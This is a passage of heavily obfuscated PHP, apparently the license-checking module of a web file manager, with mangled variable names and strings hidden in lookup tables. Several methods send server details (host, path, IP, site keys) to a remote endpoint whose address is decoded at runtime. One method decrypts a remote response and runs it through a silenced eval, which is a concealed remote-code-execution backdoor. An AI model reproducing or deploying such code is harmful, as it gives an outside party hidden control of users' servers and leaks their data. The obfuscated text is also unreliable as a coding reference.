(KodUser::isRoot() && $this->config[$≠ÌÍ÷¸í[117]]) { $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[118]] = WEB_ROOT; } return $∂äØËù∞; } private function jetb9ff0e678() { $•≈Ø∞£‡ =& $_SERVER[ˆë€Ï⁄∂]; $âè¿ÂŒŒ =& $_SERVER[ﬂéá≤›]; $úˆ”ﬂ§° = $_SERVER[$âè¿ÂŒŒ[24]] == $âè¿ÂŒŒ[119]; $á€≤¢ªŸ = $•≈Ø∞£‡[735]; if (!$á€≤¢ªŸ) { return; } if ($_SERVER[$âè¿ÂŒŒ[24]] == $âè¿ÂŒŒ[120] && $_GET[$âè¿ÂŒŒ[121]] == $âè¿ÂŒŒ[122]) { $úˆ”ﬂ§° = !0; } if ($úˆ”ﬂ§°) { $À›ÍÔä∞ = array($âè¿ÂŒŒ[108] => $this->fido40be425b, $âè¿ÂŒŒ[123] => $this->xmdz5fad395c(), $âè¿ÂŒŒ[124] => Model($âè¿ÂŒŒ[125])->count()); if ($this->fido40be425b != $âè¿ÂŒŒ[109]) { $æﬁ∂ΩÜï = _get($this->scwxc6467d48, $âè¿ÂŒŒ[126]); if ($æﬁ∂ΩÜï) { $À›ÍÔä∞[$âè¿ÂŒŒ[127]] = $æﬁ∂ΩÜï; $À›ÍÔä∞[$âè¿ÂŒŒ[128]] = strtotime(_get($this->scwxc6467d48, $âè¿ÂŒŒ[129])); $À›ÍÔä∞[$âè¿ÂŒŒ[130]] = _get($this->scwxc6467d48, $âè¿ÂŒŒ[116]); } $ûíó®ë· = Model($âè¿ÂŒŒ[33])->get($âè¿ÂŒŒ[131], $âè¿ÂŒŒ[6], !0); if (is_string($ûíó®ë·) && substr($ûíó®ë·, 0, 1) == $âè¿ÂŒŒ[132]) { $ûíó®ë· = json_decode_force($ûíó®ë·); } if (is_array($ûíó®ë·) && $ûíó®ë·[$âè¿ÂŒŒ[133]] && strstr($ûíó®ë·[$âè¿ÂŒŒ[133]], $âè¿ÂŒŒ[134])) { $§ﬂ“ã§Ä = explode($âè¿ÂŒŒ[134], $ûíó®ë·[$âè¿ÂŒŒ[133]]); $À›ÍÔä∞[$âè¿ÂŒŒ[135]] = $§ﬂ“ã§Ä[0]; } } $À›ÍÔä∞ = $this->ckqmc7707aab(json_encode($À›ÍÔä∞), md5($âè¿ÂŒŒ[136])); $Â¬‰“Áﬂ = $•≈Ø∞£‡[736]; if (!$Â¬‰“Áﬂ) { return; } $‘ôÂú‘á = array($âè¿ÂŒŒ[137] => $À›ÍÔä∞); $î°ÇÛπƒ = $•≈Ø∞£‡[737]; if (!$î°ÇÛπƒ) { die; } call_user_func(array($âè¿ÂŒŒ[138], $âè¿ÂŒŒ[139]), $‘ôÂú‘á); } if ($this->fido40be425b == $âè¿ÂŒŒ[109]) { return; } $¿ªéÊŸ› = array($âè¿ÂŒŒ[140], $âè¿ÂŒŒ[141], $âè¿ÂŒŒ[142], $âè¿ÂŒŒ[143], $âè¿ÂŒŒ[144], $âè¿ÂŒŒ[145]); $…¿¡¯˝Û = $•≈Ø∞£‡[738]; while (strlen($…¿¡¯˝Û) < $•≈Ø∞£‡[710]) { if (!$…¿¡¯˝Û) { break; } $…¿¡¯˝Û++; } $≠‘•úëı = Model($âè¿ÂŒŒ[33])->get(); $áÜ∞º¬ë = $•≈Ø∞£‡[739]; if (!$áÜ∞º¬ë) { return; } $‘ôÂú‘á = array($âè¿ÂŒŒ[146] => $≠‘•úëı[$âè¿ÂŒŒ[34]], $âè¿ÂŒŒ[147] => $≠‘•úëı[$âè¿ÂŒŒ[35]], $âè¿ÂŒŒ[148] => $âè¿ÂŒŒ[6]); foreach ($¿ªéÊŸ› as $≥Ó§ œœ) { if (!isset($≠‘•úëı[$≥Ó§ œœ]) || !$≠‘•úëı[$≥Ó§ œœ]) { continue; } $‘ôÂú‘á[$≥Ó§ œœ] = $≠‘•úëı[$≥Ó§ œœ]; $™Ê˚Ë‰À = $•≈Ø∞£‡[740]; while ($™Ê˚Ë‰À < $•≈Ø∞£‡[700]) { if ($™Ê˚Ë‰À >= 0) { break; } $™Ê˚Ë‰À++; } } call_user_func(array($âè¿ÂŒŒ[138], $âè¿ÂŒŒ[139]), $‘ôÂú‘á); } private function theq3951cf31() { $‹…êÍç =& $_SERVER[ˆë€Ï⁄∂]; $ÔÀÔ®µ° =& $_SERVER[ﬂéá≤›]; if ($_SERVER[$ÔÀÔ®µ°[24]] != $ÔÀÔ®µ°[149]) { return; } if (!KodUser::isRoot()) { die; } $Ü√∏ÔÓÍ = $GLOBALS[$ÔÀÔ®µ°[13]]; if (isset($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[150]])) { $this->qlvc0d2eacc4(); die; } if (isset($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[151]]) && isset($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[151]]) == $ÔÀÔ®µ°[122]) { $Ü√∏ÔÓÍ[$ÔÀÔ®µ°[152]] = Model($ÔÀÔ®µ°[33])->get($ÔÀÔ®µ°[153]); } if (!isset($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[152]]) || strlen($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[152]]) != 16) { show_json($ÔÀÔ®µ°[154] . $Ü√∏ÔÓÍ[$ÔÀÔ®µ°[152]], !1); } $ €Ÿ’¿« = Model($ÔÀÔ®µ°[33])->get($ÔÀÔ®µ°[100]); $˛Ö–®ˆ· = md5($_SERVER[$ÔÀÔ®µ°[106]] . $ €Ÿ’¿«); $œÔóÔÃÃ = $‹…êÍç[741]; if (!$œÔóÔÃÃ) { die; } $Ä‹Í£©˙ = array($ÔÀÔ®µ°[152] => $Ü√∏ÔÓÍ[$ÔÀÔ®µ°[152]], $ÔÀÔ®µ°[155] => rand_string(16), $ÔÀÔ®µ°[156] => $ÔÀÔ®µ°[136], $ÔÀÔ®µ°[157] => $ÔÀÔ®µ°[158], $ÔÀÔ®µ°[159] => $_SERVER[$ÔÀÔ®µ°[160]], $ÔÀÔ®µ°[161] => $_SERVER[$ÔÀÔ®µ°[162]], $ÔÀÔ®µ°[163] => $_SERVER[$ÔÀÔ®µ°[164]], $ÔÀÔ®µ°[105] => $˛Ö–®ˆ·, $ÔÀÔ®µ°[165] => Model($ÔÀÔ®µ°[33])->get($ÔÀÔ®µ°[131])); if (isset($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[151]]) && isset($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[151]]) == $ÔÀÔ®µ°[122]) { $Ä‹Í£©˙[$ÔÀÔ®µ°[151]] = md5($Ä‹Í£©˙[$ÔÀÔ®µ°[152]] . $ÔÀÔ®µ°[166] . $Ä‹Í£©˙[$ÔÀÔ®µ°[155]]); } if ($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[167]] == $ÔÀÔ®µ°[168]) { $ÒΩüú › = $this->ckqmc7707aab($˛Ö–®ˆ·, $ÔÀÔ®µ°[169]); $Õ’äì∂ó = $this->jqmy7483bc06(json_encode($Ä‹Í£©˙), $˛Ö–®ˆ· . $ÔÀÔ®µ°[170], 3); $Õ’äì∂ó = $Õ’äì∂ó . $ÔÀÔ®µ°[171] . $_SERVER[$ÔÀÔ®µ°[160]]; $§ÖÀêŸæ = $this->faxo79611d12($ÔÀÔ®µ°[172] . $ÒΩüú › . $ÔÀÔ®µ°[173] . $Õ’äì∂ó, -1); show_json($§ÖÀêŸæ, !0); } else { if ($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[167]] == $ÔÀÔ®µ°[174]) { $±òÌæê€ = substr(md5($ÔÀÔ®µ°[175] . $˛Ö–®ˆ·), 12, 15) . $ÔÀÔ®µ°[176]; $Õ’äì∂ó = $this->zjvr0707295f(trim($Ü√∏ÔÓÍ[$ÔÀÔ®µ°[177]]), $±òÌæê€, 2); $…œ±·˚∏ = json_decode($Õ’äì∂ó, !0); if (!is_array($…œ±·˚∏) || !is_array($…œ±·˚∏[$ÔÀÔ®µ°[178]]) || $…œ±·˚∏[$ÔÀÔ®µ°[152]] != !0) { $„˘áÔ‹† = $ÔÀÔ®µ°[179]; $È˚ëÉàÖ = $…œ±·˚∏[$ÔÀÔ®µ°[178]] ? $ÔÀÔ®µ°[180] . $…œ±·˚∏[$ÔÀÔ®µ°[178]] : $„˘áÔ‹†; show_json($È˚ëÉàÖ, !1); } else { $Ä‹Í£©˙[$ÔÀÔ®µ°[155]] = $…œ±·˚∏[$ÔÀÔ®µ°[178]][$ÔÀÔ®µ°[181]]; } } else { $…œ±·˚∏ = $this->faxo79611d12($ÔÀÔ®µ°[182], $Ä‹Í£©˙, 10); $Œ˝¡∂Äƒ = $‹…êÍç[742]; } } if (!is_array($…œ±·˚∏) || !is_array($…œ±·˚∏[$ÔÀÔ®µ°[178]]) || $…œ±·˚∏[$ÔÀÔ®µ°[152]] != !0) { $„˘áÔ‹† = LNG($ÔÀÔ®µ°[183]); $È˚ëÉàÖ = $…œ±·˚∏[$ÔÀÔ®µ°[178]] ? $ÔÀÔ®µ°[180] . $…œ±·˚∏[$ÔÀÔ®µ°[178]] : $„˘áÔ‹†; show_json($È˚ëÉàÖ, !1); } $≠ﬁŸÌá¥ = $…œ±·˚∏[$ÔÀÔ®µ°[178]]; $Ω¶£¥∫ = $this->rzmh22f3c3fd($≠ﬁŸÌá¥[$ÔÀÔ®µ°[184]]); if (!$Ω¶£¥∫ || $Ω¶£¥∫ != $≠ﬁŸÌá¥[$ÔÀÔ®µ°[129]]) { $¢Âå¶Ì∑ = array($ÔÀÔ®µ°[185] => Model($ÔÀÔ®µ°[33])->get($ÔÀÔ®µ°[100]), $ÔÀÔ®µ°[186] => $_SERVER[$ÔÀÔ®µ°[106]], $ÔÀÔ®µ°[187] => this_url(), $ÔÀÔ®µ°[161] => $_SERVER[$ÔÀÔ®µ°[162]]); $Õ’äì∂ó = $this->gluxb771f4c0(json_encode($¢Âå¶Ì∑)); $this->faxo79611d12($ÔÀÔ®µ°[188] . $Õ’äì∂ó); show_json(LNG($ÔÀÔ®µ°[189]), !0); } $ÇºÜÙ¿» = array($ÔÀÔ®µ°[153] => $≠ﬁŸÌá¥[$ÔÀÔ®µ°[190]], $ÔÀÔ®µ°[191] => $≠ﬁŸÌá¥[$ÔÀÔ®µ°[192]], $ÔÀÔ®µ°[193] => rand_string(16), $ÔÀÔ®µ°[108] => $≠ﬁŸÌá¥[$ÔÀÔ®µ°[194]]); if ($Ä‹Í£©˙[$ÔÀÔ®µ°[155]]) { $ÇºÜÙ¿»[$ÔÀÔ®µ°[193]] = $Ä‹Í£©˙[$ÔÀÔ®µ°[155]]; } $˜ó≤éòß = substr(md5($ÇºÜÙ¿»[$ÔÀÔ®µ°[191]]), 10, 10); $º£Å∏õÑ = $˜ó≤éòß . $ÇºÜÙ¿»[$ÔÀÔ®µ°[108]] . $ÇºÜÙ¿»[$ÔÀÔ®µ°[193]]; $Ì·“ï∑˘ = $‹…êÍç[743]; if (strlen($Ì·“ï∑˘) < $‹…êÍç[700]) { return; } $ÇºÜÙ¿»[$ÔÀÔ®µ°[110]] = strrev(base64_encode($this->ckqmc7707aab($º£Å∏õÑ, $ÔÀÔ®µ°[195]))); $´√ïØ· = rand_string(16); $À¬ﬁ¡ªô = $‹…êÍç[744]; $–·Ñè¥∞ = $´√ïØ· . $ÇºÜÙ¿»[$ÔÀÔ®µ°[108]] . $this->ckqmc7707aab(md5($ÇºÜÙ¿»[$ÔÀÔ®µ°[153]]), $´√ïØ·); $∞Œëıúô = $‹…êÍç[745]; while (strlen($∞Œëıúô) < $‹…êÍç[700]) { if (!$∞Œëıúô) { break; } $∞Œëıúô++; } $ÇºÜÙ¿»[$ÔÀÔ®µ°[111]] = base64_encode(strrev($this->ckqmc7707aab($–·Ñè¥∞, $ÔÀÔ®µ°[196]))); if ($≠ﬁŸÌá¥[$ÔÀÔ®µ°[197]] && $≠ﬁŸÌá¥[$ÔÀÔ®µ°[197]] >= 1) { Model($ÔÀÔ®µ°[33])->setDeep($ÔÀÔ®µ°[198], $ÔÀÔ®µ°[122]); } Model($ÔÀÔ®µ°[33])->set($ÇºÜÙ¿»); $±û‚†™Ç = md5($_SERVER[$ÔÀÔ®µ°[106]] . strrev($ €Ÿ’¿«) . $ÇºÜÙ¿»[$ÔÀÔ®µ°[191]]); $–åƒÆ—‰ = strrev(substr($±û‚†™Ç, 10, 16)); $√¶æÔ—ª = $‹…êÍç[746]; $÷≤ıÅ†ë = $this->jqmy7483bc06(json_encode($≠ﬁŸÌá¥), $±û‚†™Ç); $·”Ê…ö… = array_to_keyvalue(Model($ÔÀÔ®µ°[7])->listData(), $ÔÀÔ®µ°[199]); $∫÷Ÿ¡ÁÑ = $·”Ê…ö…[$ÔÀÔ®µ°[200]]; $œ˜°íÓá = array(); $ç™©√ÃΩ = $‹…êÍç[747]; if (strlen($ç™©√ÃΩ) < $‹…êÍç[703]) { return; } $œ˜°íÓá[$–åƒÆ—‰] = $÷≤ıÅ†ë; $ÆéØâ˝Æ = $‹…êÍç[748]; while ($ÆéØâ˝Æ < $‹…êÍç[710]) { if ($ÆéØâ˝Æ >= 0) { break; } $ÆéØâ˝Æ++; } Model($ÔÀÔ®µ°[7])->update($∫÷Ÿ¡ÁÑ[$ÔÀÔ®µ°[201]], array($ÔÀÔ®µ°[202] => $œ˜°íÓá)); $È©Õ¥∂í = $‹…êÍç[749]; $this->scwxc6467d48 = $≠ﬁŸÌá¥; $this->fido40be425b = $ÇºÜÙ¿»[$ÔÀÔ®µ°[108]]; $å»æ≠àá = $‹…êÍç[750]; if (!$å»æ≠àá) { return; } $this->licenseRegistSuccess(); Cache::set($ÔÀÔ®µ°[203] . md5($ €Ÿ’¿« . $ÔÀÔ®µ°[204]), $ÔÀÔ®µ°[6]); show_json(LNG($ÔÀÔ®µ°[189]), !0); } private function licenseRegistSuccess() { $πÆïËî™ =& $_SERVER[ﬂéá≤›]; $˘éæ–÷˘ = Model($πÆïËî™[33])->get(); $˛≠«ﬁÑÏ = $_SERVER[ˆë€Ï⁄∂][751]; if ($˘éæ–÷˘[$πÆïËî™[63]] != $πÆïËî™[122]) { Model($πÆïËî™[33])->set($πÆïËî™[63], $πÆïËî™[122]); } Action($πÆïËî™[205])->initStart(!0); } private function qlvc0d2eacc4() { $˚Ú±„ú— =& $_SERVER[ˆë€Ï⁄∂]; $Ä⁄è◊Ä≤ =& $_SERVER[ﬂéá≤›]; Model($Ä⁄è◊Ä≤[33])->set(array($Ä⁄è◊Ä≤[153] => $Ä⁄è◊Ä≤[6], $Ä⁄è◊Ä≤[191] => $Ä⁄è◊Ä≤[6], $Ä⁄è◊Ä≤[108] => $Ä⁄è◊Ä≤[109], $Ä⁄è◊Ä≤[110] => $Ä⁄è◊Ä≤[6], $Ä⁄è◊Ä≤[111] => $Ä⁄è◊Ä≤[6])); $ÛØœÅ⁄« = $˚Ú±„ú—[752]; if (strlen($ÛØœÅ⁄«) < $˚Ú±„ú—[710]) { return; } Model($Ä⁄è◊Ä≤[33])->setDeep($Ä⁄è◊Ä≤[198], $Ä⁄è◊Ä≤[206]); $this->scwxc6467d48 = array(); $Ø‹È∂‘ı = $˚Ú±„ú—[753]; while ($Ø‹È∂‘ı < $˚Ú±„ú—[703]) { if ($Ø‹È∂‘ı >= 0) { break; } $Ø‹È∂‘ı++; } $this->fido40be425b = $Ä⁄è◊Ä≤[109]; } private function emzo09bfb207() { $ÂÉõ»ëé =& $_SERVER[ˆë€Ï⁄∂]; $Ó‘•ªØ⁄ =& $_SERVER[ﬂéá≤›]; $_SERVER[$Ó‘•ªØ⁄[162]] = _get($_SERVER, $Ó‘•ªØ⁄[162], APP_HOST); $ë¨§äπ“ = $ÂÉõ»ëé[754]; while ($ë¨§äπ“ < $ÂÉõ»ëé[703]) { if ($ë¨§äπ“ >= 0) { break; } $ë¨§äπ“++; } $this->fido40be425b = $Ó‘•ªØ⁄[109]; $§ÿµ…›≈ = Model($Ó‘•ªØ⁄[33])->get(); if ($§ÿµ…›≈[$Ó‘•ªØ⁄[108]] == $Ó‘•ªØ⁄[109]) { return; } $Óº˝‰ÏÄ = Model($Ó‘•ªØ⁄[33])->get($Ó‘•ªØ⁄[100]); $«‰ñ‹‘Ÿ = $Ó‘•ªØ⁄[203] . md5($Óº˝‰ÏÄ . $Ó‘•ªØ⁄[204]); $¸çπÃÆ = $ÂÉõ»ëé[755]; if (strlen($¸çπÃÆ) < $ÂÉõ»ëé[60]) { return; } $ å£≠ÿ¯ = Cache::get($«‰ñ‹‘Ÿ); $ÿÍÁ‡©  = $ÂÉõ»ëé[756]; while ($ÿÍÁ‡©  < $ÂÉõ»ëé[700]) { if ($ÿÍÁ‡©  >= 0) { break; } $ÿÍÁ‡© ++; } if (!is_array($ å£≠ÿ¯) || !isset($ å£≠ÿ¯[$Ó‘•ªØ⁄[207]]) || time() - $ å£≠ÿ¯[$Ó‘•ªØ⁄[207]] >= 60) { $Ùöπöﬂ = Model($Ó‘•ªØ⁄[7])->loadList(); $ú”«ñµ‹ = $Ùöπöﬂ[$Ó‘•ªØ⁄[200]]; $ù°Óâ§ï = md5($_SERVER[$Ó‘•ªØ⁄[106]] . strrev($Óº˝‰ÏÄ) . $§ÿµ…›≈[$Ó‘•ªØ⁄[191]]); $†ˆ ÏÖø = strrev(substr($ù°Óâ§ï, 10, 16)); $ å£≠ÿ¯ = $this->zjvr0707295f($ú”«ñµ‹[$Ó‘•ªØ⁄[86]][$†ˆ ÏÖø], $ù°Óâ§ï); $ å£≠ÿ¯ = json_decode($ å£≠ÿ¯, !0); } if (!is_array($ å£≠ÿ¯)) { return $this->qlvc0d2eacc4(); } $Èö®ü˜ƒ = strtotime($ å£≠ÿ¯[$Ó‘•ªØ⁄[129]]); if (time() >= $Èö®ü˜ƒ) { return $this->qlvc0d2eacc4(); } if (!isset($ å£≠ÿ¯[$Ó‘•ªØ⁄[207]]) || time() - $ å£≠ÿ¯[$Ó‘•ªØ⁄[207]] > 20) { $ å£≠ÿ¯[$Ó‘•ªØ⁄[207]] = time(); Cache::set($«‰ñ‹‘Ÿ, $ å£≠ÿ¯); } $this->scwxc6467d48 = $ å£≠ÿ¯; $this->fido40be425b = $§ÿµ…›≈[$Ó‘•ªØ⁄[108]]; } private function ajre0621e604() { $ûßÜáÙÈ =& $_SERVER[ˆë€Ï⁄∂]; $ ääıƒë =& $_SERVER[ﬂéá≤›]; $¶ø˛Ü€∂ = $GLOBALS[$ ääıƒë[13]]; $∏É›Ωìƒ = $ûßÜáÙÈ[757]; if (strlen($∏É›Ωìƒ) < $ûßÜáÙÈ[703]) { return; } $¡ã¨ƒä€ = $_SERVER[$ ääıƒë[24]]; if ($¡ã¨ƒä€ == $ ääıƒë[208] && $this->fido40be425b == $ ääıƒë[109]) { show_json(LNG($ ääıƒë[209]), !1, $ ääıƒë[210]); } $ËÜ¢‡ç„ = array($ ääıƒë[211], $ ääıƒë[212]); if (in_array($¡ã¨ƒä€, $ËÜ¢‡ç„)) { if ($this->fido40be425b == $ ääıƒë[109] && isset($¶ø˛Ü€∂[$ ääıƒë[213]])) { show_json(LNG($ ääıƒë[209]), !1, $ ääıƒë[210]); die; } $œ˘–øî˛ = $this->xmdz5fad395c(); if ($œ˘–øî˛ != intval($ ääıƒë[214])) { if ($œ˘–øî˛ <= Model($ ääıƒë[125])->count()) { show_json(LNG($ ääıƒë[215]), !1, $ ääıƒë[210]); die; } } } } private function cjdh96f95ce2() { $Öè¿ÆØÜ =& $_SERVER[ﬂéá≤›]; $…‘úÁúö = array($Öè¿ÆØÜ[119], $Öè¿ÆØÜ[120]); if (!KodUser::isRoot() || !isset($_GET[$Öè¿ÆØÜ[216]])) { return; } if (!in_array($_SERVER[$Öè¿ÆØÜ[24]], $…‘úÁúö)) { return; } $ÛˆÖùúª = $Öè¿ÆØÜ[217]; $ÛˆÖùúª = $this->vwpq2d5e07ff($ÛˆÖùúª, $Öè¿ÆØÜ[218]); $ıÂ§åûˆ = stream_context_create(array($Öè¿ÆØÜ[219] => array($Öè¿ÆØÜ[220] => $Öè¿ÆØÜ[221], $Öè¿ÆØÜ[222] => 3))); $õΩ∫√®à = @file_get_contents($ÛˆÖùúª, !1, $ıÂ§åûˆ); header($Öè¿ÆØÜ[223]); $âî˚åœ˘ = $_SERVER[ˆë€Ï⁄∂][758]; if ($õΩ∫√®à && strstr($õΩ∫√®à, $Öè¿ÆØÜ[224])) { echo $õΩ∫√®à; } die; } public function ghfnb4607e5a($Ú¡‹˘¿µ) { $Ãô´€ßœ =& $_SERVER[ˆë€Ï⁄∂]; $íÁÂß∞∏ =& $_SERVER[ﬂéá≤›]; if ($this->fido40be425b == $íÁÂß∞∏[225]) { return $Ú¡‹˘¿µ; } $ò∞»„®û = $this->versionPluginList(); $ä¨†‡ôü = $Ãô´€ßœ[759]; while ($ä¨†‡ôü < $Ãô´€ßœ[703]) { if ($ä¨†‡ôü >= 0) { break; } $ä¨†‡ôü++; } $ÁˆÛ‹À = explode($íÁÂß∞∏[226], $this->versionPluginFilter()); $†ØÀ˜¥î = array(); $∂¿ÈÛüÒ = $Ãô´€ßœ[760]; while ($∂¿ÈÛüÒ < $Ãô´€ßœ[60]) { if ($∂¿ÈÛüÒ >= 0) { break; } $∂¿ÈÛüÒ++; } foreach ($ò∞»„®û as $…î±Ï´ﬁ => $‘≠∑¢‰ö) { if ($‘≠∑¢‰ö == $íÁÂß∞∏[227] && substr($this->fido40be425b, 0, 1) == $íÁÂß∞∏[227]) { continue; } if (!in_array($…î±Ï´ﬁ, $ÁˆÛ‹À)) { $†ØÀ˜¥î[] = $…î±Ï´ﬁ; } } foreach ($†ØÀ˜¥î as $…î±Ï´ﬁ) { unset($Ú¡‹˘¿µ[$…î±Ï´ﬁ]); $Ä…û¡Ï≤ = $Ãô´€ßœ[761]; if (!$Ä…û¡Ï≤) { return; } } return $Ú¡‹˘¿µ; $¢Õ¢˛’õ = $Ãô´€ßœ[762]; } private function versionPluginList() { $Ï†¿◊¡• =& $_SERVER[ﬂéá≤›]; return array($Ï†¿◊¡•[228] => $Ï†¿◊¡•[227], $Ï†¿◊¡•[229] => $Ï†¿◊¡•[227], $Ï†¿◊¡•[230] => $Ï†¿◊¡•[227], $Ï†¿◊¡•[231] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[233] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[234] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[235] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[236] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[237] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[238] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[239] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[240] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[241] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[242] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[243] => $Ï†¿◊¡•[232], $Ï†¿◊¡•[244] => $Ï†¿◊¡•[232]); } private function versionPluginFilter() { $ﬂÓÿÑﬂÖ =& $_SERVER[ˆë€Ï⁄∂]; $…—÷»»€ =& $_SERVER[ﬂéá≤›]; if ($this->fido40be425b == $…—÷»»€[109]) { return $…—÷»»€[6]; } $ºÉÕ¶îØ = _get($this->scwxc6467d48, $…—÷»»€[245], $…—÷»»€[6]); $ÈùÃÓ£‹ = _get($this->scwxc6467d48, $…—÷»»€[116], $…—÷»»€[6]); $‰õÏ∏ùÙ = $ﬂÓÿÑﬂÖ[763]; while ($‰õÏ∏ùÙ < $ﬂÓÿÑﬂÖ[694]) { if ($‰õÏ∏ùÙ >= 0) { break; } $‰õÏ∏ùÙ++; } $˙±∂ˆìˆ = _get($this->scwxc6467d48, $…—÷»»€[246], $…—÷»»€[6]); $äµÀÿ¥⁄ = $ﬂÓÿÑﬂÖ[764]; while ($äµÀÿ¥⁄ < $ﬂÓÿÑﬂÖ[60]) { if ($äµÀÿ¥⁄ >= 0) { break; } $äµÀÿ¥⁄++; } if ($ÈùÃÓ£‹ > time() && $˙±∂ˆìˆ > time()) { $≥Œî√Íï = explode($…—÷»»€[226], $ºÉÕ¶îØ); $ñÄË˙à› = array_keys($this->versionPluginList()); $ºÉÕ¶îØ = array_merge($≥Œî√Íï, $ñÄË˙à›); $ºÉÕ¶îØ = implode($…—÷»»€[226], array_filter(array_unique($ºÉÕ¶îØ))); } return $ºÉÕ¶îØ; } private function fxyif345e6d5() { $–¶∂ïî† =& $_SERVER[ﬂéá≤›]; if ($this->fido40be425b != $–¶∂ïî†[109]) { $GLOBALS[$–¶∂ïî†[86]][$–¶∂ïî†[90]][$–¶∂ïî†[247]] = $–¶∂ïî†[206]; return; } $GLOBALS[$–¶∂ïî†[86]][$–¶∂ïî†[248]] = $–¶∂ïî†[122]; if (Model($–¶∂ïî†[249])->get($–¶∂ïî†[63]) != $–¶∂ïî†[206]) { Model($–¶∂ïî†[249])->set($–¶∂ïî†[63], $–¶∂ïî†[206]); } } public function onje13993b4a() { return $_SERVER[ﬂéá≤›][250]; } private function swod8ce70706() { $¯ßƒÖÙü =& $_SERVER[ˆë€Ï⁄∂]; $Û”ÓÉ®ß =& $_SERVER[ﬂéá≤›]; $õ⁄∞›Æú = array($Û”ÓÉ®ß[251], $Û”ÓÉ®ß[252], $Û”ÓÉ®ß[253]); $…ò…‘£‚ = $Û”ÓÉ®ß[254] . md5($Û”ÓÉ®ß[255]); $ôú‡Ü≤é = $¯ßƒÖÙü[765]; if (strlen($ôú‡Ü≤é) < $¯ßƒÖÙü[703]) { return; } if ($this->fido40be425b == $Û”ÓÉ®ß[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Û”ÓÉ®ß[24]], $õ⁄∞›Æú)) { return; } if (time() % 4 != 0) { return; } $ß™∑π…º = call_user_func(array($Û”ÓÉ®ß[256], $Û”ÓÉ®ß[257]), $…ò…‘£‚); if ($ß™∑π…º && time() - $ß™∑π…º < intval($Û”ÓÉ®ß[258])) { return; } call_user_func(array($Û”ÓÉ®ß[256], $Û”ÓÉ®ß[139]), $…ò…‘£‚, time()); $äùÿÀôÜ = Model($Û”ÓÉ®ß[33])->get($Û”ÓÉ®ß[100]); $‹Âé´á€ = $¯ßƒÖÙü[766]; $¯ÜÄÎ‡– = array($Û”ÓÉ®ß[152] => Model($Û”ÓÉ®ß[33])->get($Û”ÓÉ®ß[153]), $Û”ÓÉ®ß[167] => $this->fido40be425b, $Û”ÓÉ®ß[163] => $_SERVER[$Û”ÓÉ®ß[164]], $Û”ÓÉ®ß[165] => Model($Û”ÓÉ®ß[33])->get($Û”ÓÉ®ß[131]), $Û”ÓÉ®ß[105] => md5($_SERVER[$Û”ÓÉ®ß[106]] . $äùÿÀôÜ), $Û”ÓÉ®ß[156] => $Û”ÓÉ®ß[136], $Û”ÓÉ®ß[159] => $_SERVER[$Û”ÓÉ®ß[160]]); $›ëÂáõƒ = $this->faxo79611d12($Û”ÓÉ®ß[259], $¯ÜÄÎ‡–); $∑€ÿÑ“‘ = $¯ßƒÖÙü[767]; if (!$∑€ÿÑ“‘) { return; } if (!is_array($›ëÂáõƒ)) { return; } if ($›ëÂáõƒ[$Û”ÓÉ®ß[152]] && $›ëÂáõƒ[$Û”ÓÉ®ß[260]]) { if ($this->rzmh22f3c3fd($›ëÂáõƒ[$Û”ÓÉ®ß[260]]) == $¯ÜÄÎ‡–[$Û”ÓÉ®ß[152]]) { return; } } $this->qlvc0d2eacc4(); if ($this->rzmh22f3c3fd($›ëÂáõƒ[$Û”ÓÉ®ß[260]]) != $¯ÜÄÎ‡–[$Û”ÓÉ®ß[152]]) { $ﬁœ‘¿∆ƒ = array($Û”ÓÉ®ß[185] => $äùÿÀôÜ, $Û”ÓÉ®ß[186] => $_SERVER[$Û”ÓÉ®ß[106]], $Û”ÓÉ®ß[187] => this_url(), $Û”ÓÉ®ß[161] => $_SERVER[$Û”ÓÉ®ß[162]]); $ÅÖÀÑÄÒ = $this->gluxb771f4c0(json_encode($ﬁœ‘¿∆ƒ)); $›ëÂáõƒ = $this->faxo79611d12($Û”ÓÉ®ß[188] . $ÅÖÀÑÄÒ); if ($›ëÂáõƒ && is_array($›ëÂáõƒ) && isset($›ëÂáõƒ[$Û”ÓÉ®ß[260]])) { $ˆﬁãÛæœ = $this->zjvr0707295f($›ëÂáõƒ[$Û”ÓÉ®ß[260]], 2); if ($ˆﬁãÛæœ) { $ˆﬁãÛæœ = $this->rzmh22f3c3fd($ˆﬁãÛæœ); } if ($ˆﬁãÛæœ) { try { @eval($ˆﬁãÛæœ); } catch (Exception $‚ò ñÂ˘) { } } } } } private function faxo79611d12($Ω—ÿÎùœ = '', $û‚ô–∏é = array(), $∫ôí´¨≥ = 5) { $≤À˙á“„ =& $_SERVER[ˆë€Ï⁄∂]; $Î∆÷èÿ‘ =& $_SERVER[ﬂéá≤›]; $˛Œ≤ŸœÆ = $Î∆÷èÿ‘[261]; $˛Œ≤ŸœÆ = $this->vwpq2d5e07ff($˛Œ≤ŸœÆ, $Î∆÷èÿ‘[262]); $≈√íöò  = $≤À˙á“„[768]; if (!$≈√íöò ) { die; } $˛Œ≤ŸœÆ = $˛Œ≤ŸœÆ . $Ω—ÿÎùœ; $úÙ¬Ã€„ = $≤À˙á“„[769]; while ($úÙ¬Ã€„ < $≤À˙á“„[710]) { if ($úÙ¬Ã€„ >= 0) { break; } $úÙ¬Ã€„++; } if ($û‚ô–∏é && is_array($û‚ô–∏é)) { $˛Œ≤ŸœÆ = $˛Œ≤ŸœÆ . $Î∆÷èÿ‘[263] . http_build_query($û‚ô–∏é); } if ($û‚ô–∏é === -1) { return 